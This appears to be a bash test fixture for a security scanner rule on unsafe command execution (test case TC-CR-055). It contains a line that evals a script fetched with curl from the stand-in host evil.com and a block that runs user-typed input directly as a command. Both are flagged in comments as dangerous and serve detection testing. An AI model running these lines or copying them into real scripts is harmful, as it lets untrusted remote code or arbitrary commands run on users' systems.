#!/bin/bash
# SEC-51: Unsafe Direct Command Execution
# Test: TC-CR-055

eval "echo hello"  # eval is dangerous
eval "$(curl -s https://evil.com/payload.sh)"  # even worse

# Direct execution of user input
echo "Enter command:"
read cmd
$cmd  # Arbitrary command execution
